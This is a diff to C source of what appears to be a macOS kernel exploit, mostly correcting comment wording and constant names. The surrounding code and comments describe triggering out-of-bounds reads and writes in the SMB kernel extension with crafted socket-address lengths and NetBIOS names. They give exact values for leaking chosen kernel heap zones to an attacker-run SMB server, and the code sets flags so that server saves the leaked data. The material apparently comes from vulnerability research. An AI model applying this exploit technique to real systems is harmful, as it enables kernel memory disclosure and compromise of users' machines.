@@ -38,9 +38,9 @@
 /// `KHEAP_KEXT`.
 ///
 /// If the socket address family of server socket address is `AF_NETBIOS`, before sending the
-/// SMB negotiate request to SMB server, a netbios session must be setup. For this the socket
+/// SMB negotiate request to SMB server, a NetBIOS session must be setup. For this the socket
 /// addresses `iod->iod_saddr` and `iod->iod_laddr` is duplicated using `smb_dup_sockaddr`
-/// method and then the netbios names of the duplicated addresses are sent to SMB server using
+/// method and then the NetBIOS names of the duplicated addresses are sent to SMB server using
 /// `nbssn_rq_request` method.
 ///
 /// As discussed in the `poc_oob_write`, the method `smb_dup_sockaddr` used for duplicating
@@ -50,31 +50,31 @@
 /// than 64 which could lead to OOB write in `default.64` zone.
 ///
 /// Also as discussed in the `poc_snb_name_oob_read`, the method `nb_put_name` used to add
-/// the netbios name to request data will ignore the size of `snb_name` field and it will copy the
-/// netbios name from socket address to request data until it encounters a segment with no data,
+/// the NetBIOS name to request data will ignore the size of `snb_name` field and it will copy the
+/// NetBIOS name from socket address to request data until it encounters a segment with no data,
 /// which could lead to OOB read in `default.64` zone. The request data is sent to SMB server
-/// to setup netbios session
+/// to setup NetBIOS session
 ///
 /// By adjusting the values of ioc address length, socket address length and netbios name, we
 /// can get OOB read from any zone with size less than 128 bytes in `KHEAP_KEXT`
 ///
-/// Example 1: OOB read from `kext.96` zone
+/// Example 1: OOB read from `default.96` zone
 /// This can be done by setting `ioc_saddr_len` to `96`, `saddr->sa_len` to `96 * 2` and
 /// `saddr->snb_name[0] = 96 - offsetof(struct sockaddr_nb, snb_name) + 96 - 1`. This will lead
-/// to `iod->iod_saddr` being allocated on kext.96 zone. The `smb_dup_sockaddr` method will
+/// to `iod->iod_saddr` being allocated on default.96 zone. The `smb_dup_sockaddr` method will
 /// allocate memory for duplicated socket address from default.64 zone and copies `96 * 2` bytes
 /// from `iod->iod_saddr` to duplicated socket address, triggering the OOB read of 96 bytes from
-/// kext.96 zone and OOB write of 128 bytes in default.64 zone. Then the `nb_put_name` method
+/// default.96 zone and OOB write of 128 bytes in default.64 zone. Then the `nb_put_name` method
 /// will copy atleast `saddr->snb_name[0] + 1` bytes of data from the duplicated socket address
 /// to the netbios request sent to SMB server. The `offsetof(struct sockaddr_nb, snb_name)` is
 /// 20 bytes, which means atleast 172 bytes of data will sent to SMB server as server netbios
 /// name. Of this 172 bytes, the first 76 bytes came from memory allocated for `iod->iod_saddr`
-/// and the reset 96 bytes came from the succeeding zone element of `iod->iod_saddr` in kext.96
+/// and the reset 96 bytes came from the succeeding zone element of `iod->iod_saddr` in default.96
 /// zone. NOTE: since OOB write occurs in default.64 zone, care must be taken to make sure the
 /// OOB write will not eventually trigger kernel panic. See xpl_oob_reader_ovf.c for using this
 /// method to achieve OOB read in zones on `KHEAP_KEXT` with size greater than 32
 ///
-/// Example 2: OOB read from `kext.32` zone
+/// Example 2: OOB read from `default.32` zone
 /// For this the values are `ioc_saddr_len = 32`, `saddr->sa_len = 64` and
 /// `saddr->snb_name[0] = 75`. The main difference from previous example is that there will be
 /// no OOB write in default.64 zone because `saddr->sa_len <= 64` bytes
@@ -146,19 +146,19 @@ void xpl_oob_reader_base_read(const struct xpl_oob_reader_base_args* args, char*
     /// Embed custom instructions for xpl_smbx server. See
     /// `RequestHandler::handleNetbiosSsnRequest` method in xpl_smbx/main.swift
     struct xpl_smbx_nb_laddr_cmd* cmd_paddr = (struct xpl_smbx_nb_laddr_cmd*)&laddr.snb_name[1];
-    cmd_paddr->magic = xpl_SMBX_NB_LADDR_CMD_MAGIC;
+    cmd_paddr->magic = XPL_SMBX_NB_LADDR_CMD_MAGIC;
     /// Generate a unique key for this request. This key can then be used to retrieve the
-    /// local and server netbios name sent to the server (which will contain the OOB read data)
+    /// local and server NetBIOS name sent to the server (which will contain the OOB read data)
     cmd_paddr->key = atomic_fetch_add(&g_kmem_oob_reader->keygen, 1);
     /// Tell xpl_smbx server to save the received server and local netbios name
-    cmd_paddr->flags = xpl_SMBX_NB_LADDR_CMD_FLAG_SAVE;
-    /// Tell xpl_smbx server to respond with `NB_SSN_NEGRESP` response code whiich will
+    cmd_paddr->flags = XPL_SMBX_NB_LADDR_CMD_FLAG_SAVE;
+    /// Tell xpl_smbx server to respond with `NB_SSN_NEGRESP` response code which will
     /// lead to failure of `SMBIOC_NEGOTIATE` ioctl syscall. This will allow us to reuse the
     /// `g_kmem_oob_reader->fd_kmem_reader` without having to close and open an new
     /// SMB device (`SMBIOC_NEGOTIATE` ioctl command is used to create a new smb
     /// session and after one successfull execution of this command on a smb device, the
     /// subsequent attempts to execute this command will fail with error `EISCONN`)
-    cmd_paddr->flags |= xpl_SMBX_NB_LADDR_CMD_FLAG_FAIL;
+    cmd_paddr->flags |= XPL_SMBX_NB_LADDR_CMD_FLAG_FAIL;
     
     /// Execute the `SMBIOC_NEGOTIATE` leading to OOB read data being sent to xpl_smbx
     /// server
